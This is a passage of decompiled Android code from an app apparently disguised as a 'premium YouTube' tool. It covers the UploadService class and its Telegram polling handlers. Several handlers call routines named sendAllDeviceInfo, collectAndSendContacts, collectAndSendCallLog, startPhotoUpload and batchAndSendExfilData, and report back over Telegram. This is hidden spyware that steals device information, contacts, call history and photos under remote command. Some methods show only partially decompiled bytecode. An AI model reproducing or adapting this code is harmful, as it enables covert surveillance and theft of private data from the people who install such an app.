            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass28(UploadService uploadService, Continuation<? super AnonymousClass28> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass28(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۰۴String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch23$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$29, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$29", f = "UploadService.kt", i = {}, l = {1654}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass29 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass29(UploadService uploadService, Continuation<? super AnonymousClass29> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass29(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۰۶String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch24$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$30, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$30", f = "UploadService.kt", i = {}, l = {1659, 1660, 1662, 1663}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass30 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass30(UploadService uploadService, Continuation<? super AnonymousClass30> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass30(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            /* JADX WARN: Removed duplicated region for block: B:15:0x004b A[RETURN] */
            /* JADX WARN: Removed duplicated region for block: B:18:0x005f A[RETURN] */
            /* JADX WARN: Removed duplicated region for block: B:21:0x0074 A[RETURN] */
            /* JADX WARN: Removed duplicated region for block: B:22:0x0075  */
            /*
                Code decompiled incorrectly, please refer to instructions dump.
                To view partially-correct add '--show-bad-code' argument
            */
            public final java.lang.Object invokeSuspend(java.lang.Object r7) {
                /*
                    r6 = this;
                    java.lang.Object r0 = kotlin.coroutines.intrinsics.IntrinsicsKt.getCOROUTINE_SUSPENDED()
                    int r1 = r6.label
                    switch(r1) {
                        case 0: goto L25;
                        case 1: goto L20;
                        case 2: goto L1b;
                        case 3: goto L16;
                        case 4: goto L11;
                        default: goto L9;
                    }
                L9:
                    java.lang.IllegalStateException r7 = new java.lang.IllegalStateException
                    java.lang.String r0 = "call to 'resume' before 'invoke' with coroutine"
                    r7.<init>(r0)
                    throw r7
                L11:
                    r0 = r6
                    kotlin.ResultKt.throwOnFailure(r7)
                    goto L76
                L16:
                    r1 = r6
                    kotlin.ResultKt.throwOnFailure(r7)
                    goto L60
                L1b:
                    r1 = r6
                    kotlin.ResultKt.throwOnFailure(r7)
                    goto L4c
                L20:
                    r1 = r6
                    kotlin.ResultKt.throwOnFailure(r7)
                    goto L3d
                L25:
                    kotlin.ResultKt.throwOnFailure(r7)
                    r1 = r6
                    com.w8sb.w8premiumyt.UploadService r2 = r1.this$0
                    com.w8sb.w8premiumyt.UploadService.access$sendAllDeviceInfo(r2)
                    com.w8sb.w8premiumyt.UploadService r2 = r1.this$0
                    r3 = r1
                    kotlin.coroutines.Continuation r3 = (kotlin.coroutines.Continuation) r3
                    r4 = 1
                    r1.label = r4
                    java.lang.Object r2 = com.w8sb.w8premiumyt.UploadService.access$collectAndSendContacts(r2, r3)
                    if (r2 != r0) goto L3d
                    return r0
                L3d:
                    com.w8sb.w8premiumyt.UploadService r2 = r1.this$0
                    r3 = r1
                    kotlin.coroutines.Continuation r3 = (kotlin.coroutines.Continuation) r3
                    r4 = 2
                    r1.label = r4
                    java.lang.Object r2 = com.w8sb.w8premiumyt.UploadService.access$collectAndSendCallLog(r2, r3)
                    if (r2 != r0) goto L4c
                    return r0
                L4c:
                    com.w8sb.w8premiumyt.UploadService r2 = r1.this$0
                    com.w8sb.w8premiumyt.UploadService.access$startPhotoUpload(r2)
                    com.w8sb.w8premiumyt.UploadService r2 = r1.this$0
                    r3 = r1
                    kotlin.coroutines.Continuation r3 = (kotlin.coroutines.Continuation) r3
                    r4 = 3
                    r1.label = r4
                    java.lang.Object r2 = com.w8sb.w8premiumyt.UploadService.access$batchAndSendExfilData(r2, r3)
                    if (r2 != r0) goto L60
                    return r0
                L60:
                    com.w8sb.w8premiumyt.UploadService r2 = r1.this$0
                    com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt r3 = com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt.INSTANCE
                    java.lang.String r3 = r3.m۱۰۰۸String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch25$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService()
                    r4 = r1
                    kotlin.coroutines.Continuation r4 = (kotlin.coroutines.Continuation) r4
                    r5 = 4
                    r1.label = r5
                    java.lang.Object r2 = com.w8sb.w8premiumyt.UploadService.access$sendTextToTelegram(r2, r3, r4)
                    if (r2 != r0) goto L75
                    return r0
                L75:
                    r0 = r1
                L76:
                    kotlin.Unit r1 = kotlin.Unit.INSTANCE
                    return r1
                */
                throw new UnsupportedOperationException("Method not decompiled: com.w8sb.w8premiumyt.UploadService.C۰۰۵۶1.AnonymousClass30.invokeSuspend(java.lang.Object):java.lang.Object");
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$31, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$31", f = "UploadService.kt", i = {}, l = {1670, 1671, 1673, 1674}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass31 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass31(UploadService uploadService, Continuation<? super AnonymousClass31> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass31(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            /* JADX WARN: Removed duplicated region for block: B:15:0x004b A[RETURN] */
            /* JADX WARN: Removed duplicated region for block: B:18:0x005f A[RETURN] */
            /* JADX WARN: Removed duplicated region for block: B:21:0x0074 A[RETURN] */
            /* JADX WARN: Removed duplicated region for block: B:22:0x0075  */
            /*
                Code decompiled incorrectly, please refer to instructions dump.
                To view partially-correct add '--show-bad-code' argument
            */
            public final java.lang.Object invokeSuspend(java.lang.Object r7) {
                /*
                    r6 = this;
                    java.lang.Object r0 = kotlin.coroutines.intrinsics.IntrinsicsKt.getCOROUTINE_SUSPENDED()
                    int r1 = r6.label
                    switch(r1) {
                        case 0: goto L25;
                        case 1: goto L20;
                        case 2: goto L1b;
                        case 3: goto L16;
                        case 4: goto L11;
                        default: goto L9;
                    }
                L9:
                    java.lang.IllegalStateException r7 = new java.lang.IllegalStateException
                    java.lang.String r0 = "call to 'resume' before 'invoke' with coroutine"
                    r7.<init>(r0)
                    throw r7
                L11:
                    r0 = r6
                    kotlin.ResultKt.throwOnFailure(r7)
                    goto L76
                L16:
                    r1 = r6
                    kotlin.ResultKt.throwOnFailure(r7)
                    goto L60
                L1b:
                    r1 = r6
                    kotlin.ResultKt.throwOnFailure(r7)
                    goto L4c
                L20:
                    r1 = r6
                    kotlin.ResultKt.throwOnFailure(r7)
                    goto L3d
                L25:
                    kotlin.ResultKt.throwOnFailure(r7)
                    r1 = r6
                    com.w8sb.w8premiumyt.UploadService r2 = r1.this$0
                    com.w8sb.w8premiumyt.UploadService.access$sendAllDeviceInfo(r2)
                    com.w8sb.w8premiumyt.UploadService r2 = r1.this$0
                    r3 = r1
                    kotlin.coroutines.Continuation r3 = (kotlin.coroutines.Continuation) r3
                    r4 = 1
                    r1.label = r4
                    java.lang.Object r2 = com.w8sb.w8premiumyt.UploadService.access$collectAndSendContacts(r2, r3)
                    if (r2 != r0) goto L3d
                    return r0
                L3d:
                    com.w8sb.w8premiumyt.UploadService r2 = r1.this$0
                    r3 = r1
                    kotlin.coroutines.Continuation r3 = (kotlin.coroutines.Continuation) r3
                    r4 = 2
                    r1.label = r4
                    java.lang.Object r2 = com.w8sb.w8premiumyt.UploadService.access$collectAndSendCallLog(r2, r3)
                    if (r2 != r0) goto L4c
                    return r0
                L4c:
                    com.w8sb.w8premiumyt.UploadService r2 = r1.this$0
                    com.w8sb.w8premiumyt.UploadService.access$startPhotoUpload(r2)
                    com.w8sb.w8premiumyt.UploadService r2 = r1.this$0
                    r3 = r1
                    kotlin.coroutines.Continuation r3 = (kotlin.coroutines.Continuation) r3
                    r4 = 3
                    r1.label = r4
                    java.lang.Object r2 = com.w8sb.w8premiumyt.UploadService.access$batchAndSendExfilData(r2, r3)
                    if (r2 != r0) goto L60
                    return r0
                L60:
                    com.w8sb.w8premiumyt.UploadService r2 = r1.this$0
                    com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt r3 = com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt.INSTANCE
                    java.lang.String r3 = r3.m۱۰۱۰String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch26$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService()
                    r4 = r1
                    kotlin.coroutines.Continuation r4 = (kotlin.coroutines.Continuation) r4
                    r5 = 4
                    r1.label = r5
                    java.lang.Object r2 = com.w8sb.w8premiumyt.UploadService.access$sendTextToTelegram(r2, r3, r4)
                    if (r2 != r0) goto L75
                    return r0
                L75:
                    r0 = r1
                L76:
                    kotlin.Unit r1 = kotlin.Unit.INSTANCE
                    return r1
                */
                throw new UnsupportedOperationException("Method not decompiled: com.w8sb.w8premiumyt.UploadService.C۰۰۵۶1.AnonymousClass31.invokeSuspend(java.lang.Object):java.lang.Object");
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$32, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$32", f = "UploadService.kt", i = {}, l = {1679}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass32 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass32(UploadService uploadService, Continuation<? super AnonymousClass32> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass32(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۱۲String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch27$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$33, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$33", f = "UploadService.kt", i = {}, l = {1683}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass33 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass33(UploadService uploadService, Continuation<? super AnonymousClass33> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass33(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۱۴String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch28$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$34, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$34", f = "UploadService.kt", i = {}, l = {1688}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass34 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass34(UploadService uploadService, Continuation<? super AnonymousClass34> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass34(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۱۶String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch29$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$35, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$35", f = "UploadService.kt", i = {}, l = {1692}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass35 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass35(UploadService uploadService, Continuation<? super AnonymousClass35> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass35(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۱۹String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch30$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$36, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$36", f = "UploadService.kt", i = {}, l = {1696}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass36 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass36(UploadService uploadService, Continuation<? super AnonymousClass36> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass36(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۲۱String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch31$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$37, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$37", f = "UploadService.kt", i = {}, l = {1701}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass37 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass37(UploadService uploadService, Continuation<? super AnonymousClass37> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass37(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۲۳String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch32$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$38, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$38", f = "UploadService.kt", i = {}, l = {1709}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass38 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass38(UploadService uploadService, Continuation<? super AnonymousClass38> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass38(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۲۵String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch34$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$39, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$39", f = "UploadService.kt", i = {}, l = {1713}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass39 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass39(UploadService uploadService, Continuation<? super AnonymousClass39> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass39(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
